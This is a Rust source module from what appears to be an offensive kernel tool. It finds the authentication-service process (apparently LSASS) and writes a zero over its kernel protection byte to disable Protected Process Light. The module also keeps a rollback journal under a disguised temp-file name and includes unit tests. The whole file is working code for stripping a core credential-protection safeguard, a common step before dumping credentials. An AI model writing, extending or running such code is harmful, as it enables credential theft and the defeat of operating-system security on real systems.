//! Reversible authentication-service PPL control with exact state recovery.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{read_u32, read_u64, write_u32, write_u64, zero},
    output::Output,
    process::{find_process, read_process_record, same_kernel_state},
    profiles::{KernelField, KernelProfile},
    recovery::{RecoveryError, RecoveryStore, checksum},
    session::KernelSession,
};
use core::fmt::Write;

const RECOVERY_NAME: &[u16] = &[
    b'c' as u16,
    b'a' as u16,
    b'c' as u16,
    b'h' as u16,
    b'e' as u16,
    b'7' as u16,
    b'2' as u16,
    b'D' as u16,
    b'A' as u16,
    b'.' as u16,
    b't' as u16,
    b'm' as u16,
    b'p' as u16,
    0,
];
const JOURNAL_BYTES: usize = 56;
const JOURNAL_MAGIC: u32 = 0x4c50_504b;
const JOURNAL_VERSION: u32 = 1;
const JOURNAL_NONCE: u64 = 0x3150_504c_4e52_4b00;
const AUTH_SIGNATURE_LEVEL: u8 = 0x3c;
const AUTH_SECTION_SIGNATURE_LEVEL: u8 = 0x08;
const AUTH_PPL: u8 = 0x41;
const PPL_DISABLED: u8 = 0;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum PplAction {
    Cycle,
    Disable,
    Restore,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct PplJournal {
    target_pid: u32,
    kernel_timestamp: u32,
    kernel_checksum: u32,
    kernel_image_size: u32,
    protection_offset: u32,
    original: [u8; 3],
    changed: [u8; 3],
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct PplFailure {
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
}

pub fn run<A: KernelAdapter>(adapter: &mut A, action: PplAction, output: &mut Output) {
    output.line(match action {
        PplAction::Cycle => "[*] Cycling authentication-service PPL state",
        PplAction::Disable => "[*] Disabling authentication-service PPL state",
        PplAction::Restore => "[*] Restoring authentication-service PPL state",
    });

    let result = match action {
        PplAction::Cycle | PplAction::Disable => change(adapter, action, output),
        PplAction::Restore => restore(adapter, output),
    };

    match result {
        Ok(()) => output.line(match action {
            PplAction::Cycle => "[+] PPL cycle complete; original state restored",
            PplAction::Disable => "[+] PPL disabled; run `ppl restore` when finished",
            PplAction::Restore => "[+] PPL restored; recovery record removed",
        }),
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] PPL action failed at {} (0x{:08x}); rollback={}; recovery-retained={}",
                error.stage,
                error.code,
                yes_no(error.rollback),
                yes_no(error.recovery_retained)
            );
        }
    }
}

fn change<A: KernelAdapter>(
    adapter: &mut A,
    action: PplAction,
    output: &mut Output,
) -> Result<(), PplFailure> {
    let mut session = open(adapter)?;
    let profile = session.kernel.profile;
    let system_process = session.system_process;
    let action_result = change_opened(session.adapter(), profile, system_process, action, output);
    let close = session.close();

    match (action_result, close) {
        (Ok(()), Ok(())) => Ok(()),
        (Err(error), _) => Err(error),
        (Ok(()), Err(error)) => Err(PplFailure {
            stage: "adapter-close",
            code: error.code(),
            rollback: action == PplAction::Cycle,
            recovery_retained: action == PplAction::Disable,
        }),
    }
}

fn change_opened<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    system_process: u64,
    action: PplAction,
    output: &mut Output,
) -> Result<(), PplFailure> {
    let (before, walked) = find_process(adapter, profile, system_process, None)
        .map_err(|error| failure(error.stage(), error.code(), false, false))?;

    if before.signature_level != AUTH_SIGNATURE_LEVEL
        || before.section_signature_level != AUTH_SECTION_SIGNATURE_LEVEL
        || before.protection != AUTH_PPL
    {
        return Err(failure("exact-original-state", 13, false, false));
    }

    let stable = read_process_record(adapter, profile, before.eprocess)
        .map_err(|error| failure(error.stage(), error.code(), false, false))?;

    if !same_kernel_state(&before, &stable) {
        return Err(failure("stability-compare", 1237, false, false));
    }

    let _ = writeln!(
        output,
        "[*] Target           : pid={} image={} walked={}",
        before.pid,
        before.display_name(),
        walked
    );
    output.line("[*] Original state   : protected-light signer=lsa; exact state verified");
    let journal = PplJournal::new(profile, &before);
    let mut record = journal.encode();

    RecoveryStore::write_new(RECOVERY_NAME, &record).map_err(|error| {
        zero(&mut record);
        recovery_failure(error, false, false)
    })?;
    output.line("[*] Recovery         : integrity record created and flushed");
    let address = before.eprocess + profile.value(KernelField::EprocessProtection) as u64;
    let changed = [PPL_DISABLED];
    let write_result = adapter.write_kernel(address, &changed);
    let changed_record = read_process_record(adapter, profile, before.eprocess);
    let changed_valid = write_result.is_ok()
        && changed_record
            .as_ref()
            .is_ok_and(|after| exact_process_state(&before, after, PPL_DISABLED));

    if !changed_valid {
        let rollback = rollback(adapter, profile, &before);

        if rollback {
            let _ = RecoveryStore::delete(RECOVERY_NAME);
        }

        let code = write_result
            .err()
            .map(|error| error.code())
            .or_else(|| changed_record.err().map(|error| error.code()))
            .unwrap_or(13);
        zero(&mut record);
        return Err(failure("ppl-readback", code, rollback, !rollback));
    }

    output.line("[*] Changed state    : protection=none; one-byte write verified");

    if action == PplAction::Cycle {
        let restored = rollback(adapter, profile, &before);

        if !restored {
            zero(&mut record);
            return Err(failure("ppl-cycle-restore", 13, false, true));
        }

        RecoveryStore::delete(RECOVERY_NAME)
            .map_err(|error| recovery_failure(error, true, true))?;
        output.line("[*] Restored state   : protected-light signer=lsa; readback exact");
    }

    zero(&mut record);

    Ok(())
}

fn restore<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<(), PplFailure> {
    let mut record = [0_u8; JOURNAL_BYTES];
    RecoveryStore::read_exact(RECOVERY_NAME, &mut record)
        .map_err(|error| recovery_failure(error, false, true))?;
    let journal = PplJournal::decode(&record)
        .ok_or_else(|| failure("recovery-integrity", 13, false, true))?;
    zero(&mut record);
    let mut session = open(adapter)?;
    let profile = session.kernel.profile;
    let system_process = session.system_process;
    let action_result = restore_opened(session.adapter(), profile, system_process, journal, output);
    let close = session.close();

    match (action_result, close) {
        (Ok(()), Ok(())) => Ok(()),
        (Err(error), _) => Err(error),
        (Ok(()), Err(error)) => Err(failure("adapter-close", error.code(), true, false)),
    }
}

fn restore_opened<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    system_process: u64,
    journal: PplJournal,
    output: &mut Output,
) -> Result<(), PplFailure> {
    if !journal.matches_profile(profile) {
        return Err(failure("recovery-profile", 13, false, true));
    }

    let (before, _) = find_process(adapter, profile, system_process, None)
        .map_err(|error| failure(error.stage(), error.code(), false, true))?;

    if before.pid != journal.target_pid as u64
        || [
            before.signature_level,
            before.section_signature_level,
            before.protection,
        ] != journal.changed
    {
        return Err(failure("exact-changed-state", 13, false, true));
    }

    let address = before.eprocess + profile.value(KernelField::EprocessProtection) as u64;
    adapter
        .write_kernel(address, &journal.original[2..3])
        .map_err(|error| failure("ppl-restore-write", error.code(), false, true))?;
    let after = read_process_record(adapter, profile, before.eprocess)
        .map_err(|error| failure(error.stage(), error.code(), false, true))?;

    if !exact_process_state(&before, &after, journal.original[2]) {
        return Err(failure("ppl-restore-readback", 13, false, true));
    }

    RecoveryStore::delete(RECOVERY_NAME).map_err(|error| recovery_failure(error, true, true))?;
    output.line("[*] Restored state   : protected-light signer=lsa; readback exact");

    Ok(())
}

fn open<A: KernelAdapter>(adapter: &mut A) -> Result<KernelSession<'_, A>, PplFailure> {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);

    KernelSession::open(adapter, REQUIRED, 1)
        .map_err(|error| failure(error.stage, error.code, false, false))
}

fn rollback<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    before: &crate::process::ProcessRecord,
) -> bool {
    let address = before.eprocess + profile.value(KernelField::EprocessProtection) as u64;

    adapter.write_kernel(address, &[before.protection]).is_ok()
        && read_process_record(adapter, profile, before.eprocess)
            .is_ok_and(|after| exact_process_state(before, &after, before.protection))
}

fn exact_process_state(
    before: &crate::process::ProcessRecord,
    after: &crate::process::ProcessRecord,
    protection: u8,
) -> bool {
    before.eprocess == after.eprocess
        && before.pid == after.pid
        && before.token_fast_ref == after.token_fast_ref
        && before.signature_level == after.signature_level
        && before.section_signature_level == after.section_signature_level
        && after.protection == protection
}

impl PplJournal {
    fn new(profile: &KernelProfile, process: &crate::process::ProcessRecord) -> Self {
        Self {
            target_pid: process.pid as u32,
            kernel_timestamp: profile.value(KernelField::PeTimestamp),
            kernel_checksum: profile.value(KernelField::PeChecksum),
            kernel_image_size: profile.value(KernelField::ImageSize),
            protection_offset: profile.value(KernelField::EprocessProtection),
            original: [
                process.signature_level,
                process.section_signature_level,
                process.protection,
            ],
            changed: [
                process.signature_level,
                process.section_signature_level,
                PPL_DISABLED,
            ],
        }
    }

    fn encode(self) -> [u8; JOURNAL_BYTES] {
        let mut output = [0_u8; JOURNAL_BYTES];
        write_u32(&mut output, 0, JOURNAL_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.target_pid);
        write_u32(&mut output, 16, self.kernel_timestamp);
        write_u32(&mut output, 20, self.kernel_checksum);
        write_u32(&mut output, 24, self.kernel_image_size);
        write_u32(&mut output, 28, self.protection_offset);
        output[32..35].copy_from_slice(&self.original);
        output[35..38].copy_from_slice(&self.changed);
        write_u64(&mut output, 40, JOURNAL_NONCE);
        let integrity = checksum(&output[..48]);
        write_u64(&mut output, 48, integrity);

        output
    }

    fn decode(input: &[u8; JOURNAL_BYTES]) -> Option<Self> {
        if read_u32(input, 0)? != JOURNAL_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != JOURNAL_BYTES as u32
            || read_u64(input, 40)? != JOURNAL_NONCE
            || read_u64(input, 48)? != checksum(&input[..48])
        {
            return None;
        }

        let journal = Self {
            target_pid: read_u32(input, 12)?,
            kernel_timestamp: read_u32(input, 16)?,
            kernel_checksum: read_u32(input, 20)?,
            kernel_image_size: read_u32(input, 24)?,
            protection_offset: read_u32(input, 28)?,
            original: input[32..35].try_into().ok()?,
            changed: input[35..38].try_into().ok()?,
        };

        if journal.target_pid <= 4
            || journal.original != [AUTH_SIGNATURE_LEVEL, AUTH_SECTION_SIGNATURE_LEVEL, AUTH_PPL]
            || journal.changed
                != [
                    AUTH_SIGNATURE_LEVEL,
                    AUTH_SECTION_SIGNATURE_LEVEL,
                    PPL_DISABLED,
                ]
        {
            return None;
        }

        Some(journal)
    }

    fn matches_profile(self, profile: &KernelProfile) -> bool {
        self.kernel_timestamp == profile.value(KernelField::PeTimestamp)
            && self.kernel_checksum == profile.value(KernelField::PeChecksum)
            && self.kernel_image_size == profile.value(KernelField::ImageSize)
            && self.protection_offset == profile.value(KernelField::EprocessProtection)
    }
}

const fn failure(
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
) -> PplFailure {
    PplFailure {
        stage,
        code,
        rollback,
        recovery_retained,
    }
}

const fn recovery_failure(
    error: RecoveryError,
    rollback: bool,
    recovery_retained: bool,
) -> PplFailure {
    failure(error.stage(), error.code(), rollback, recovery_retained)
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles::KERNEL_PROFILES;

    #[test]
    fn journal_round_trip_is_exact() {
        let profile = &KERNEL_PROFILES[0];
        let journal = PplJournal {
            target_pid: 500,
            kernel_timestamp: profile.value(KernelField::PeTimestamp),
            kernel_checksum: profile.value(KernelField::PeChecksum),
            kernel_image_size: profile.value(KernelField::ImageSize),
            protection_offset: profile.value(KernelField::EprocessProtection),
            original: [AUTH_SIGNATURE_LEVEL, AUTH_SECTION_SIGNATURE_LEVEL, AUTH_PPL],
            changed: [
                AUTH_SIGNATURE_LEVEL,
                AUTH_SECTION_SIGNATURE_LEVEL,
                PPL_DISABLED,
            ],
        };

        assert_eq!(PplJournal::decode(&journal.encode()), Some(journal));
    }

    #[test]
    fn journal_rejects_tampering() {
        let mut record = PplJournal {
            target_pid: 500,
            kernel_timestamp: 1,
            kernel_checksum: 2,
            kernel_image_size: 3,
            protection_offset: 4,
            original: [AUTH_SIGNATURE_LEVEL, AUTH_SECTION_SIGNATURE_LEVEL, AUTH_PPL],
            changed: [
                AUTH_SIGNATURE_LEVEL,
                AUTH_SECTION_SIGNATURE_LEVEL,
                PPL_DISABLED,
            ],
        }
        .encode();
        record[12] ^= 1;

        assert_eq!(PplJournal::decode(&record), None);
    }
}
